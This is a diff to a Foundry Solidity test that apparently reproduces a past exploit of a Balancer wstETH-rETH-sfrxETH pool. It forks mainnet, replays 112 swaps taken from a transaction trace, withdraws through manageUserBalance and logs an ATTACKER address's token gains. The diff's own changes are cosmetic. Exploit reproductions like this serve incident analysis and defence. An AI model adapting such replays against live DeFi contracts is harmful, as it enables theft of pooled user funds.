@@ -48,7 +48,6 @@ interface IBalancerVault {
         );
 
     function manageUserBalance(UserBalanceOp[] memory ops) external payable;
-
     function getInternalBalance(address user, IERC20[] memory tokens)
         external view
         returns (uint256[] memory balances);
@@ -65,14 +64,11 @@ interface IERC20 {
 
 contract BalancerQuadPoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-
-    // Pool: wstETH-rETH-sfrxETH-BPT (Ethereum)
     bytes32 constant POOL_ID_QUAD = 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467;
     address constant QUAD_BPT = 0x5aEe1e99fE86960377DE9f88689616916D5DcaBe;
     address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
     address constant sfrxETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
     address constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
-
     address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
 
     struct ExactSwapData {
@@ -90,9 +86,8 @@ contract BalancerQuadPoolTest is Test {
             23717101
         );
 
-        console.log("=== QUAD POOL TEST (wstETH-rETH-sfrxETH-BPT) ===");
-        console.log("Pool: wstETH-rETH-sfrxETH (0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467)");
 
+        console.log("Pool: wstETH-rETH-sfrxETH (0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467)");
         (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD);
 
         console.log("INITIAL STATE:");
@@ -117,7 +112,7 @@ contract BalancerQuadPoolTest is Test {
             toInternalBalance: true
         });
 
-        // Exact swaps from transaction trace
+        // swaps from transaction trace
         ExactSwapData[112] memory swaps;
 
         swaps[0] = ExactSwapData({
@@ -1152,8 +1147,6 @@ contract BalancerQuadPoolTest is Test {
         console.log("Swaps executed:", successCount, "/", swaps.length);
 
         // Withdrawal via manageUserBalance
-        console.log("=== WITHDRAWAL manageUserBalance() ===");
-
         IERC20[] memory internalTokens = new IERC20[](4);
         internalTokens[0] = IERC20(QUAD_BPT);
         internalTokens[1] = IERC20(wstETH);
@@ -1238,7 +1231,7 @@ contract BalancerQuadPoolTest is Test {
         console.log("sfrxETH:", IERC20(sfrxETH).balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("Total swaps executed:", successCount);
+        console.log("Total swaps:", successCount);
         console.log("SUCCESS!");
     }
 
